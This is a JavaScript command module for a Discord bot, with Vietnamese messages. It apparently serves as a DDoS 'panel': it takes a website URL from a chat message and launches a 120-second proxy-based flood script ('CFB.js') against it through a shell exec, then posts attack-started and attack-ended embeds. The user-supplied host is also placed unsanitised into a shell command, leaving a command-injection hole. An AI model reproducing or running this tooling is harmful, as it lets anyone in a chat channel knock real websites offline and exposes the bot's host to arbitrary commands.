const Discord = require("discord.js");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;

if (message.channel.id != room) {
	return;
  }

if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('CẢNH BÁO')
	.setDescription("`Mẫu .CFB-V1 https://example.com/`")
	.setFooter("Vui lòng không tấn công các website có domain .gov")
	message.channel.send(embed1);
	return;
	}

var exec = require('child_process').exec
exec(`node CFB.js ${host} 120 30 proxies.txt`, (error, stdout, stderr) => {
});
setTimeout(function(){ 
    console.log('Cuộc tấn công đã dừng lại ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🔥 **PANEL** 🔥')
	.setTimestamp()
	.setDescription("**► Cuộc tấn công đã kết thúc 💥**")
	.setFooter('© Developer: BaoAn', client.user.avatarURL)
	.setTimestamp()
	.setThumbnail("")
 message.channel.send(embed);
 }, 120000); //time in milliseconds
var gifler = ["https://media4.giphy.com/media/11FuEnXyGsXFba/giphy.gif?cid=ecf05e47tpunszt2a81rfjesu7eo8fg0gxkrntrkxeqbxvcf&rid=giphy.gif&ct=g", "https://media4.giphy.com/media/11FuEnXyGsXFba/giphy.gif?cid=ecf05e47tpunszt2a81rfjesu7eo8fg0gxkrntrkxeqbxvcf&rid=giphy.gif&ct=g", "https://media4.giphy.com/media/11FuEnXyGsXFba/giphy.gif?cid=ecf05e47tpunszt2a81rfjesu7eo8fg0gxkrntrkxeqbxvcf&rid=giphy.gif&ct=g" , "https://media4.giphy.com/media/11FuEnXyGsXFba/giphy.gif?cid=ecf05e47tpunszt2a81rfjesu7eo8fg0gxkrntrkxeqbxvcf&rid=giphy.gif&ct=g"];
    var randomgif = gifler[Math.floor((Math.random() * gifler.length))];
console.log('Start Attacking ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🔥 **PANEL** 🔥')
	.setTimestamp()
  .setDescription("**𝐔𝐬𝐞𝐫**: `" + message.author.username + "` \n **𝐇𝐨𝐬𝐭**: `" + host + "` \n **𝐌𝐞𝐭𝐡𝐨𝐝**: `CFB-V1` \n **𝐓𝐢𝐦𝐞**: `120`")	
  .setFooter('© Developer: BaoAn', client.user.avatarURL)
	.setTimestamp()
	.setImage(randomgif)
	.setThumbnail("")
 message.channel.send(embed);
  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['CFB-V1'],
  permLevel: 0
}

exports.help = {
  name: 'CFB-V1',
  description: 'BaoAn',
  usage: 'CFB-V1'
}